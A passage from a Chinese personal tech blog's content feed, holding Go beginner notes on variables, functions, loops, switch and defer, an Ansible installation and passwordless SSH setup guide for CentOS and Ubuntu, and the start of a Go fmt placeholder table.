class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build hexxo.<span class="keyword">go</span></span><br><span class="line">会生成一个hello.exe</span><br><span class="line">执行hello.exe</span><br><span class="line">Hello （结果）</span><br></pre></td></tr></table></figure></div><h2 id="代码理解"><a href="#代码理解" class="headerlink" title="代码理解"></a>代码理解</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果是为了将代码编译成一个可执行程序，那么package必须是main</span><br><span class="line">如果是为了将代码编译成库，那么package则没有限制</span><br></pre></td></tr></table></figure></div><ul><li>main()为程序的主函数</li><li>fmt 是go的一个系统库 （路径为C:\Go\src\fmt）</li><li>fmt.Println()打印输出</li></ul><h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><p>格式：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var 变量名 变量类型</span><br><span class="line">go语言中定义的函数必须被用到，否则会报错</span><br><span class="line">同时定义变量和赋值可以通过： 变量名：=值</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//import "fmt"</span></span><br><span class="line"><span class="comment">//var c,python,java bool</span></span><br><span class="line"><span class="comment">//func main()  &#123;</span></span><br><span class="line"><span class="comment">//var i int</span></span><br><span class="line"><span class="comment">//fmt.Println(i,c,python,java)</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i,j  = <span class="number">1</span>,<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> c,python,java = <span class="literal">true</span>,<span class="literal">false</span>,<span class="string">"no!"</span></span><br><span class="line">fmt.Println(i,j,c,python,java)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x <span class="keyword">int</span>,y <span class="keyword">int</span>)</span>  <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> x+y</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Println(add(<span class="number">100</span>,<span class="number">200</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当两个或者多个连续的函数命名是同一个类型</span><br><span class="line">则除了最后一个类型外，其他省略。</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(x,y <span class="keyword">int</span>)</span>  <span class="title">int</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> x+y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="多值返回"><a href="#多值返回" class="headerlink" title="多值返回"></a>多值返回</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">swap</span><span class="params">(x,y <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">string</span>,<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> x,y</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">a,b := swap(<span class="string">"hello"</span>,<span class="string">"word"</span>)</span><br><span class="line">fmt.Println(a,b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="命名返回值"><a href="#命名返回值" class="headerlink" title="命名返回值"></a>命名返回值</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">split</span><span class="params">(sum <span class="keyword">int</span>)</span> <span class="params">(x,y <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">x = sum*<span class="number">4</span></span><br><span class="line">y = sum<span class="number">-100</span></span><br><span class="line"><span class="keyword">return</span>  x,y</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Println(split(<span class="number">1000</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"math"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> x,y <span class="keyword">int</span>  =  <span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">float64</span>  =  math.Sqrt(<span class="keyword">float64</span>(x*x+y*y))       <span class="comment">//math.Sqrt 计算平方根</span></span><br><span class="line"><span class="keyword">var</span> z <span class="keyword">int</span> = <span class="keyword">int</span>(f)</span><br><span class="line">  z := <span class="keyword">int</span>(f)</span><br><span class="line">fmt.Println(x,y,z)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">常量的定义与变量相似，只不过使用const关键词。</span><br><span class="line">常量可以是字符，字符串，数字类型等</span><br><span class="line">常量不能使用 ;= 语法定义。</span><br></pre></td></tr></table></figure></div><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Go 只有一种循环结构-“for”循环</span><br><span class="line">for 也是Go 的“while”</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">sum := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span> ;i &lt; <span class="number">10</span> ; i++ &#123;</span><br><span class="line">sum += i</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"math"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sqrt</span><span class="params">(x <span class="keyword">float64</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> x &lt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> sqrt(-x)+ <span class="string">"i"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>  fmt.Sprint(math.Sqrt(x))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Println(sqrt(<span class="number">2</span>),sqrt(<span class="number">-4</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//func pow(x,n,lim float64) float64  &#123;</span></span><br><span class="line"><span class="comment">//if v := math.Pow(x,n); v &lt; lim&#123;</span></span><br><span class="line"><span class="comment">//return v</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//return lim</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//func main()  &#123;</span></span><br><span class="line"><span class="comment">//fmt.Println(</span></span><br><span class="line"><span class="comment">//pow(3,2,10),</span></span><br><span class="line"><span class="comment">//pow(3,3,20),</span></span><br><span class="line"><span class="comment">//)</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">值为：<span class="number">1.4142135623730951</span> <span class="number">2i</span></span><br></pre></td></tr></table></figure></div><h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"math"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pow</span><span class="params">(x,n,lim <span class="keyword">float64</span>)</span> <span class="title">float64</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> v := math.Pow(x,n); v &lt; lim&#123;</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">"%g&gt;=%g\n"</span>,v,lim)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> lim</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Println(</span><br><span class="line">pow(<span class="number">3</span>,<span class="number">2</span>,<span class="number">10</span>),</span><br><span class="line">pow(<span class="number">3</span>,<span class="number">3</span>,<span class="number">20</span>),</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line">值为：<span class="number">27</span>&gt;=<span class="number">20</span></span><br><span class="line">           <span class="number">9</span> <span class="number">20</span></span><br></pre></td></tr></table></figure></div><h2 id="循环和函数"><a href="#循环和函数" class="headerlink" title="循环和函数"></a>循环和函数</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在这个例子中，牛顿法是通过选择一个初始点 z 然后重复这一过程求 Sqrt(x) 的近似值：</span><br><span class="line">z = z - (z*z-x)/(2*z)</span><br><span class="line">为了做到这个，只需要重复计算 10 次，并且观察不同的值（1，2，3，……）是如何逐步逼近结果的。</span><br><span class="line">然后，修改循环条件，使得当值停止改变（或改变非常小）的时候退出循环。观察迭代次数是否变化。</span><br><span class="line">结果与 [[http://golang.org/pkg/math/#Sqrt][math.Sqrt] 接近吗？</span><br><span class="line">提示：定义并初始化一个浮点值，向其提供一个浮点语法或使用转换：</span><br><span class="line"></span><br><span class="line">z := float64(1)</span><br><span class="line">z := 1.0</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sqrt</span><span class="params">(x <span class="keyword">float64</span>)</span> <span class="title">float64</span></span> &#123;</span><br><span class="line"><span class="keyword">const</span> a  =  <span class="number">0.000001</span></span><br><span class="line">z := <span class="keyword">float64</span>(<span class="number">1</span>)</span><br><span class="line">k := <span class="keyword">float64</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> ;; z = z - (z*z-x)/(<span class="number">2</span>*z) &#123;</span><br><span class="line"><span class="keyword">if</span> z-k &lt;= a &amp;&amp; z-k &gt;= -a &#123;</span><br><span class="line"><span class="keyword">return</span> z</span><br><span class="line">&#125;</span><br><span class="line">k=z</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Println(sqrt(<span class="number">2</span>))</span><br><span class="line">&#125;</span><br><span class="line">值为：<span class="number">1.4142135623730951</span></span><br></pre></td></tr></table></figure></div><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switch 的条件从上到下的执行，当匹配成功的时候停止。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"runtime"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Print(<span class="string">"go runs on "</span>)</span><br><span class="line"><span class="keyword">switch</span> os := runtime.GOOS; os &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">"darwin"</span>:</span><br><span class="line">fmt.Println(<span class="string">"os x"</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="string">"linux"</span>:</span><br><span class="line">fmt.Println(<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Printf(<span class="string">"%s"</span>,os)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defer语句会延迟函数的执行直到上层函数返回。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">"world"</span>)</span><br><span class="line">fmt.Println(<span class="string">"hello"</span>)</span><br><span class="line">&#125;</span><br><span class="line">值为：hello</span><br><span class="line">           world</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装ansible</title>
      <link href="/2018/09/10/ansible/"/>
      <url>/2018/09/10/ansible/</url>
      
        <content type="html"><![CDATA[<h1 id="ANSIBLE"><a href="#ANSIBLE" class="headerlink" title="ANSIBLE"></a>ANSIBLE</h1><h2 id="centos-安装-Minimal版本无法获取IP解决"><a href="#centos-安装-Minimal版本无法获取IP解决" class="headerlink" title="centos 安装 Minimal版本无法获取IP解决"></a>centos 安装 Minimal版本无法获取IP解决</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">ONBOOT=yes  (修改内容)</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure></div><h2 id="CENTOS-安装-ansible"><a href="#CENTOS-安装-ansible" class="headerlink" title="CENTOS 安装 ansible"></a>CENTOS 安装 ansible</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum install ansible</span><br></pre></td></tr></table></figure></div><h2 id="Ubuntu-安装-ansible"><a href="#Ubuntu-安装-ansible" class="headerlink" title="Ubuntu 安装 ansible"></a>Ubuntu 安装 ansible</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo apt-add-repository ppa:ansible/ansible</span><br><span class="line">sudo apt-get  update</span><br><span class="line">sudo apt-get install ansible</span><br><span class="line">将会报错说无法安装</span><br></pre></td></tr></table></figure></div><h2 id="Ubuntu-安装-ansible报错解决"><a href="#Ubuntu-安装-ansible报错解决" class="headerlink" title="Ubuntu 安装 ansible报错解决"></a>Ubuntu 安装 ansible报错解决</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">添加源</span><br><span class="line">sudo vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br><span class="line">deb http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br><span class="line">deb-src http:<span class="comment">//mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br></pre></td></tr></table></figure></div><h2 id="ansible-配置"><a href="#ansible-配置" class="headerlink" title="ansible 配置"></a>ansible 配置</h2><h3 id="配置linux主机ssh无密码访问"><a href="#配置linux主机ssh无密码访问" class="headerlink" title="配置linux主机ssh无密码访问"></a>配置linux主机ssh无密码访问</h3><p>一,生成密钥</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line"><span class="built_in">cd</span>   .ssh</span><br><span class="line">id_rsa 为私钥  id-rsa.pub为公钥</span><br></pre></td></tr></table></figure></div><p>二,下发公钥</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id     [-i [identity_file]]    [-p port]    [user]@hostname</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ansible </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang fmt格式“占位符”</title>
      <link href="/2018/09/10/fmt-ge-shi-zhan-wei-fu/"/>
      <url>/2018/09/10/fmt-ge-shi-zhan-wei-fu/</url>
      
        <content type="html"><![CDATA[<h1 id="GoLang-fmt格式“占位符”"><a href="#GoLang-fmt格式“占位符”" class="headerlink" title="GoLang fmt格式“占位符”"></a>GoLang fmt格式“占位符”</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typr human <span class="keyword">struct</span>&#123;</span><br><span class="line">  name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span>  people = human&#123;name:<span class="string">"FUN"</span>&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">普通占位符</span><br><span class="line">占位符         说明                                          举例               输出</span><br><span class="line">%v           相应值的默认格式                     printf(&quot;%v&quot;,people)        &#123;FUN&#125;</span><br><span class="line">%+v          打印结构体时，会添加字段             printf（“%+v”,people）     &#123;name:&quot;FUN&quot;&#125;</span><br></pre></td></tr></table></figure></div><div 